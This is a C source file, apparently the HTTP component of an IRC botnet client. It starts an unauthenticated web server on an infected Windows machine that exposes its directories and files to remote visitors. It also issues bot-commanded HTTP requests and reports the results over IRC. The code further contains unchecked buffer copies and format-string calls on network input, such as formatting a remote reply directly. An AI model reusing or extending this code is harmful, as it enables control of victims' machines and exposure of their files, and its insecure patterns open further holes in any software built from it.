#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_HTTPD

//FIX ME: Pass these from function to function
// globals
BOOL http_type;
BOOL http_info = FALSE;
char http_file[MAX_PATH];
char http_path[MAX_PATH];
int http_length;

SOCKET Listen(int port)
{
	SOCKET sock;
	if ((sock = fsocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) 
		return -1;

	SOCKADDR_IN SockAddr;
	memset(&SockAddr, 0, sizeof(SockAddr));
	SockAddr.sin_family = AF_INET;
	SockAddr.sin_port = fhtons(port);
	SockAddr.sin_addr.s_addr = INADDR_ANY;

	if (fbind(sock, (SOCKADDR *)&SockAddr, sizeof(SockAddr)) != 0) 
		return -1;//port is in use ?

	if (flisten(sock, SOMAXCONN) != 0) 
		return -1;

	return sock;
}

int HTTP_server(char *IP, int port, char *dir, BOOL dirinfo)
{
	SOCKET httpsock;

	char buf[250], httpdir[MAX_PATH];
	DWORD id;
	unsigned int threadnum;

	memset(httpdir,0,sizeof(httpdir));
	if (dir[strlen(dir)-1] == 92) 
		dir[strlen(dir)-1] = '\0';
	strcpy(httpdir,dir);

	if ((httpsock = Listen(port)) == -1)
		return -1;

	sprintf(buf,"[HTTP] Server listening on IP: %s:%d, Directory: %s\\",IP,port,httpdir);
	threadnum = addthread(buf,HTTP_THREAD,httpsock);
	threads[threadnum].port = port;
	threads[threadnum].info = dirinfo;
	strncpy(threads[threadnum].dir, httpdir, sizeof(threads[threadnum].dir)-1);
	if ((threads[threadnum].tHandle = CreateThread(NULL, 0, &HTTP_server_thread, (LPVOID)threadnum, 0, &id)) == NULL) {
		fclosesocket(httpsock);
		return -1;
	}

	return threadnum;
}

DWORD WINAPI HTTP_server_thread(LPVOID Param) 
{
	SOCKADDR_IN  GuestAddr;
	SOCKET guest;

	char buffer[4096], rBuffer[4096], file[MAX_PATH], *file_to_send = "\0";

	int addrlen, threadnum = (int)Param;
    unsigned int i,r,b,max;
	unsigned long mode = 1;

	if (fioctlsocket(threads[threadnum].sock,FIONBIO,&mode) == SOCKET_ERROR) {
		addlog("[HTTP]: A socket error occured.");
		ExitThread(1);
	}

	fd_set master, temp; 
	FD_ZERO(&master); FD_ZERO(&temp);
 	FD_SET(threads[threadnum].sock, &master);
	max = threads[threadnum].sock;

	while (1) {
		temp = master;
		if (fselect(max+1, &temp, NULL, NULL, NULL) == SOCKET_ERROR)
			break;
          
		for(i=0; i<= max; i++) {
			if (fFD_ISSET(i, &temp)) { //there is somthing to do 
				if (i == threads[threadnum].sock) {
					//there is a new connection request
					addrlen = sizeof(GuestAddr);

                    if ((guest = faccept(threads[threadnum].sock, (SOCKADDR *)&GuestAddr,&addrlen)) == INVALID_SOCKET)  
						continue; 
					else {
						FD_SET(guest, &master); // add to master set
                        if (guest > (unsigned int) max)  
							max = guest;
                    }
                } else {
    				memset(buffer,0,sizeof(buffer));
					memset(rBuffer,0,sizeof(rBuffer));
                    if (frecv(i, buffer, sizeof(buffer), 0) <= 0) { //socket error
                        fclosesocket(i); 
                        FD_CLR(i, &master); // remove from master set
                    } else {
						memset(file,0,sizeof(file));
						for (b=0,r=0; b<strlen(buffer); b++,r++) {
							rBuffer[r] = buffer[b];
							if (buffer[b] == '\n') {  //check the request....
								if (strstr(rBuffer,"GET ") != NULL && strlen(rBuffer) > 5) { //look for a GET request
									file_to_send = strtok(strstr(strstr(rBuffer,"GET ")," ")," ");
									strcpy(file,file_to_send);

								} else if (strcmp(rBuffer,"\r\n") == 0) {  //end of the request check if there is anything to send back
									FD_CLR(i, &master);
									if (file != NULL) {
										if (strlen(file)+strlen(threads[threadnum].dir) < MAX_PATH) { 
											unsigned long mode2 = 0;
											fioctlsocket(i,FIONBIO,&mode2);
											Check_Requestedfile(i,threads[threadnum].dir,file,threads[threadnum].info);
										} else 
											fclosesocket(i);
									} else 
										fclosesocket(i);
									break;
								}
								memset(rBuffer,0,sizeof(rBuffer));
								r=-1;
							}
                		} 
        			}
				}
			}
		}
	}

	fclosesocket(threads[threadnum].sock);
	clearthread(threadnum);

	ExitThread(0);
}

DWORD WINAPI http_header(LPVOID param)
{
	SOCKET sock = (SOCKET)param;
	/*
	HTTPD httpd = *((HTTPD *)pParam);
	HTTPD *httpds = (HTTPD *)pParam;
	httpds->info = TRUE;
	*/
	char tFile[MAX_PATH], nFile[MAX_PATH], content[50], buffer[4096], date[70], time[30];

	http_info = TRUE;

	sprintf(tFile,http_file); 
	sprintf(nFile,http_path); 
	//sprintf(tFile,httpd.file); 
	//sprintf(nFile,httpd.path); 

	// if (httpd.type) 
	if (http_type) 
		sprintf(content,"text/html");
	else 
		sprintf(content,"application/octet-stream");

	GetDateFormat(0x409,0,0,"ddd, dd MMM yyyy",date,70);
	GetTimeFormat(0x409,0,0,"HH:mm:ss",time,30);

	// if (httpd.length == -1)
	if (http_length == -1)
		sprintf(buffer,"HTTP/1.0 200 OK\r\nServer: myBot\r\nCache-Control: no-cache,no-store,max-age=0\r\npragma: no-cache\r\nContent-Type: %s\r\nAccept-Ranges: bytes\r\nDate: %s %s GMT\r\nLast-Modified: %s %s GMT\r\nExpires: %s %s GMT\r\nConnection: close\r\n\r\n",content,date,time,date,time,date,time);
	else
		//sprintf(buffer,"HTTP/1.0 200 OK\r\nServer: myBot\r\nCache-Control: no-cache,no-store,max-age=0\r\npragma: no-cache\r\nContent-Type: %s\r\nContent-Length: %i\r\nAccept-Ranges: bytes\r\nDate: %s %s GMT\r\nLast-Modified: %s %s GMT\r\nExpires: %s %s GMT\r\nConnection: close\r\n\r\n",content,httpd.length,date,time,date,time,date,time);
		sprintf(buffer,"HTTP/1.0 200 OK\r\nServer: myBot\r\nCache-Control: no-cache,no-store,max-age=0\r\npragma: no-cache\r\nContent-Type: %s\r\nContent-Length: %i\r\nAccept-Ranges: bytes\r\nDate: %s %s GMT\r\nLast-Modified: %s %s GMT\r\nExpires: %s %s GMT\r\nConnection: close\r\n\r\n",content,http_length,date,time,date,time,date,time);
	fsend(sock,buffer,strlen(buffer),0);

	// if (httpd.type == FALSE) 
	if (http_type == FALSE) 
		// http_send_file(httpd.sock,tFile);
		http_send_file(sock,tFile);
	else 
		// getfiles(tFile,httpd.sock,NULL,nFile); 
		getfiles(tFile,sock,NULL,nFile); 

	// fclosesocket(httpd.sock);
	fclosesocket(sock);

	ExitThread(0);
}


int Check_Requestedfile(SOCKET sock, char *dir ,char *rFile, BOOL dirinfo)
{
	char file[MAX_PATH], nFile[MAX_PATH], tFile[MAX_PATH];

	DWORD c,d, id;
	BOOL directory = FALSE;

	memset(nFile,0,sizeof(nFile));
	if (rFile[0] != 47) 
		sprintf(file,"\\%s",rFile);
	else {
		rFile[0] = 92;
		sprintf(file,"%s",rFile);
	}
	for (c=0,d=0; c<strlen(file); c++,d++) {
		if ((((c+2 < strlen(file) && file[c] == 37 && file[c+1] == 50 && file[c+2] == 48)))) {
			nFile[d] = 32;
			c=c+2;
		} else 
			if (file[c] == 47) 
				nFile[d] = 92;
			else 
				nFile[d] = file[c];
	}
	sprintf(tFile,"%s%s",dir,nFile);
	strtok(tFile,"\n");

	switch(GetFileAttributes(tFile)) {
	case FILE_ATTRIBUTE_DIRECTORY:
		directory = TRUE;
		break;
	case 0xFFFFFFFF:
		fclosesocket(sock);
		return 0;
	}

	if (nFile[d-1] == 92) 
		directory = TRUE;

	if (directory) {
		if (dirinfo) {
			// HTTPD httpd;
			strcat(tFile,"*");
			/*
			sprintf(httpd.file,tFile);

			file_to_html(nFile);
			sprintf(httpd.path,nFile);

			httpd.info = FALSE;
			httpd.type = TRUE;
			httpd.length = -1;
			httpd.sock = sock;
			*/

			sprintf(http_file,tFile);

			file_to_html(nFile);
			sprintf(http_path,nFile);

			http_info = FALSE;
			http_type = TRUE;
			http_length = -1;

			//if (CreateThread(NULL, 0, &http_header, (LPVOID)&httpd, 0, &id))
			if (CreateThread(NULL, 0, &http_header, (LPVOID)sock, 0, &id))
				// while (httpd.info == FALSE) 
				while (http_info == FALSE) 
					Sleep(5);
			else 
				fclosesocket(sock);
		} else
			fclosesocket(sock);
	} else {
		HANDLE testfile = CreateFile(tFile,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
      	if (testfile != INVALID_HANDLE_VALUE) {
			/*
			HTTPD httpd;
			sprintf(httpd.file,tFile);

			httpd.info = FALSE;
			httpd.type = FALSE;
			httpd.length = GetFileSize(testfile,NULL);
			httpd.sock = sock;
			*/
			sprintf(http_file,tFile);

			http_info = FALSE;
			http_type = FALSE;
			http_length = GetFileSize(testfile,NULL);
			CloseHandle(testfile);

			//if (CreateThread(NULL, 0, &http_header, (LPVOID)&httpd, 0, &id))
			if (CreateThread(NULL, 0, &http_header, (LPVOID)sock, 0, &id))
				// while (httpd.info == FALSE) 
				while (http_info == FALSE) 
					Sleep(5);
			else
				fclosesocket(sock);
		}
	}

	return 0;
}

int getfiles(char *current, SOCKET sock, char *chan, char *URL)
{
	FILETIME ftBuf;
	SYSTEMTIME stBuf;
	WIN32_FIND_DATA WFD;
		
	char sendbuf[IRCLINE],parent[MAX_PATH],tmpDate[40],tmpDir[MAX_PATH+2];
	int count=0, count2=0;
	unsigned int COL1=230, COL2=150, COL3=60, FILESIZE=30;
  
	memset(parent,0,sizeof(parent));
	strtok(current,"\n");
	if (chan) 
		_snprintf(sendbuf,sizeof(sendbuf),"PRIVMSG %s :Searching for: %s\r\n",chan,current);
	else 
		if (URL) {
			current[(strlen(current)-1)]=0;

			_snprintf(sendbuf,sizeof(sendbuf),"<HTML>\r\n<HEAD>\r\n<TITLE>Index of %s</TITLE>\r\n</HEAD>\r\n<BODY>\r\n", 
				current);
			fsend(sock,sendbuf,strlen(sendbuf),0);

			_snprintf(sendbuf,sizeof(sendbuf),"<H1>Index of %s</H1>\r\n<TABLE BORDER=\"0\">\r\n", 
				current);
			fsend(sock,sendbuf,strlen(sendbuf),0);

			current[(strlen(current))]='*';

			_snprintf(sendbuf,sizeof(sendbuf),"<TR>\r\n<TD WIDTH=\"%d\"><CODE>Name</CODE></TD>\r\n<TD WIDTH=\"%d\"><CODE>Last Modified</CODE></TD>\r\n<TD WIDTH=\"%d\" ALIGN=\"right\"><CODE>Size</CODE></TD>\r\n</TR>\r\n", 
				COL1, COL2, COL3);
			fsend(sock,sendbuf,strlen(sendbuf),0);

			_snprintf(sendbuf,sizeof(sendbuf),"<TR>\r\n<TD COLSPAN=\"3\"><HR></TD>\r\n</TR>\r\n");
		} else 
			_snprintf(sendbuf,sizeof(sendbuf),"Searching for: %s\r\n",current);

	fsend(sock,sendbuf,strlen(sendbuf),0);
	if (URL && strlen(URL) > 2) {
		unsigned int c;

		for (c=strlen(URL)-3; c!=0; c--)
			if (URL[c] == 47) 
				break;
		strncpy(parent,URL,c+1);

		_snprintf(sendbuf,sizeof(sendbuf),"<TR>\r\n<TD COLSPAN=\"3\"><A HREF=\"%s\"><CODE>Parent Directory</CODE></A></TD>\r\n</TR>\r\n",parent);
		fsend(sock,sendbuf,strlen(sendbuf),0);
	}

	 HANDLE Hnd = FindFirstFile(current, &WFD);
	while (FindNextFile(Hnd, &WFD)) {
		if ((WFD.dwFileAttributes) &&  (strcmp(WFD.cFileName, "..") && strcmp(WFD.cFileName, "."))) {
			FileTimeToLocalFileTime(&WFD.ftLastWriteTime, &ftBuf);
			FileTimeToSystemTime(&ftBuf, &stBuf);
			sprintf(tmpDate, "%2.2d/%2.2d/%4d  %2.2d:%2.2d %s",
				stBuf.wMonth, stBuf.wDay, stBuf.wYear, HOUR(stBuf.wHour), stBuf.wMinute, AMPM(stBuf.wHour));

			if (WFD.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				count2++;
				if (chan) { 
					_snprintf(tmpDir,sizeof(tmpDir),"<%s>",WFD.cFileName);
					_snprintf(sendbuf,sizeof(sendbuf),"PRIVMSG %s :%-31s  %-21s\n",chan,tmpDir, tmpDate);
				} else 
					if (URL) {
						_snprintf(sendbuf,(sizeof(sendbuf)-1),"<TR>\r\n<TD WIDTH=\"%d\"><A HREF=\"",COL1);
	 					fsend(sock,sendbuf,strlen(sendbuf),0);

						_snprintf(sendbuf,(sizeof(sendbuf)-1),"%s%s/",URL,WFD.cFileName);
	 					fsend(sock,sendbuf,strlen(sendbuf),0);

						if(strlen(WFD.cFileName)>FILESIZE)
							_snprintf(sendbuf,(sizeof(sendbuf)-1),"\"><CODE>%.29s&gt;/</CODE></A>",WFD.cFileName);
						else
							_snprintf(sendbuf,(sizeof(sendbuf)-1),"\"><CODE>%s/</CODE></A>",WFD.cFileName);
	 					fsend(sock,sendbuf,strlen(sendbuf),0);

						_snprintf(sendbuf,(sizeof(sendbuf)-1),"</TD>\r\n<TD WIDTH=\"%d\"><CODE>%s</CODE></TD>\r\n<TD WIDTH=\"%d\" ALIGN=\"right\"><CODE>-</CODE></TD>\r\n</TR>\r\n",
							COL2,tmpDate,COL3);
					} else {
						_snprintf(tmpDir,sizeof(tmpDir),"<%s>",WFD.cFileName);
						_snprintf(sendbuf,sizeof(sendbuf),"%-31s  %-21s\r\n",tmpDir,tmpDate);
					}
			} else {
				count++;
				if (chan) 
					_snprintf(sendbuf,sizeof(sendbuf),"PRIVMSG %s :%-31s  %-21s (%s bytes)\n",chan,WFD.cFileName,tmpDate,commaI64(WFD.nFileSizeLow));
				else 
					if (URL) {
						_snprintf(sendbuf,(sizeof(sendbuf)-1),"<TR>\r\n<TD WIDTH=\"%d\"><A HREF=\"",COL1);
	 					fsend(sock,sendbuf,strlen(sendbuf),0);

						_snprintf(sendbuf,(sizeof(sendbuf)-1),"%s%s",URL,WFD.cFileName);
	 					fsend(sock,sendbuf,strlen(sendbuf),0);

						if(strlen(WFD.cFileName)>(FILESIZE+1))
							_snprintf(sendbuf,(sizeof(sendbuf)-1),"\"><CODE>%.30s&gt;</CODE></A>",WFD.cFileName);
						else
							_snprintf(sendbuf,(sizeof(sendbuf)-1),"\"><CODE>%s</CODE></A>",WFD.cFileName);
	 					fsend(sock,sendbuf,strlen(sendbuf),0);

						_snprintf(sendbuf,(sizeof(sendbuf)-1),"</TD>\r\n<TD WIDTH=\"%d\"><CODE>%s</CODE></TD>\r\n<TD WIDTH=\"%d\" ALIGN=\"right\"><CODE>%dk</CODE></TD>\r\n</TR>\r\n",
							COL2,tmpDate,COL3,(WFD.nFileSizeLow/1024));
					} else 
						_snprintf(sendbuf,sizeof(sendbuf),"%-31s  %-21s (%i bytes)\r\n",WFD.cFileName,tmpDate,WFD.nFileSizeLow);
			}
			fsend(sock,sendbuf,strlen(sendbuf),0);

			if (chan) 
				Sleep(FLOOD_DELAY);
		}
      
	}
	FindClose(Hnd);

	if (chan) 
		sprintf(sendbuf,"PRIVMSG %s :Found %s Files and %s Directories\n",chan,commaI64(count),commaI64(count2));
	else if (URL) 
		sprintf(sendbuf,"<TR>\r\n<TD COLSPAN=\"3\"><HR></TD>\r\n</TR>\r\n</TABLE>\r\n</BODY>\r\n</HTML>\r\n"); 
	else 
		sprintf(sendbuf,"Found: %i Files and %i Directories\r\n",count,count2);
	fsend(sock,sendbuf,strlen(sendbuf),0);

	return 0;
}

void http_send_file(SOCKET sock, char *file)
{
	char buffer[1024];

	unsigned int Fsize,Fsend=1024,move;
	DWORD mode=0;

	HANDLE testfile = CreateFile(file,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
	if (testfile == INVALID_HANDLE_VALUE) 
		return;

	Fsize = GetFileSize(testfile,NULL);
	
	while (Fsize) {
		memset(buffer,0,sizeof(buffer));

		if (Fsend>Fsize) 
			Fsend=Fsize;
		move=0-Fsize;

		SetFilePointer(testfile, move, NULL, FILE_END);
		ReadFile(testfile, buffer, Fsend, &mode, NULL);

		int bytes_sent=fsend(sock, buffer, Fsend, 0);
		if (bytes_sent == SOCKET_ERROR) {
			if (fWSAGetLastError() != WSAEWOULDBLOCK) 
				break;
			else 
				bytes_sent = 0;
		}
		Fsize=Fsize-bytes_sent;
	}

	if (testfile != INVALID_HANDLE_VALUE) 
		CloseHandle(testfile);

	return;
}

char *file_to_html(char *file)
{
	for (unsigned int c=0; c<strlen(file); c++)
		if (file[c] == 92) 
			file[c] = 47;

	return file;
}

void HTTP_connect(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *host, int port, char *method, char *url, char *referer)
{
	char sendbuf[IRCLINE], buffer[256], buffer2[256];

	memcpy(buffer2,0,sizeof(buffer2));

	WORD version = MAKEWORD(1,1);
	WSADATA wsaData;
	fWSAStartup(version, &wsaData);

	LPHOSTENT lpHostEntry = fgethostbyname(host);
	SOCKET httpsock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	SOCKADDR_IN sas;
	sas.sin_family = AF_INET;
	sas.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list);
	sas.sin_port = fhtons(port);

	fconnect(httpsock, (LPSOCKADDR)&sas, sizeof(struct sockaddr));

	_snprintf(buffer,sizeof(buffer),"%s %s HTTP/1.1\nReferer: %s\nHost: %s\nConnection: close\n\n",method,url,((referer)?(referer):("")),host);

	fsend(httpsock, buffer, strlen(buffer), 0);
	frecv(httpsock, buffer2, sizeof(buffer2), 0);

	fclosesocket(httpsock);
	fWSACleanup();

	sprintf(sendbuf, buffer2);
	if (!silent) irc_privmsg(sock, chan, sendbuf, notice);

	return;
}
#endif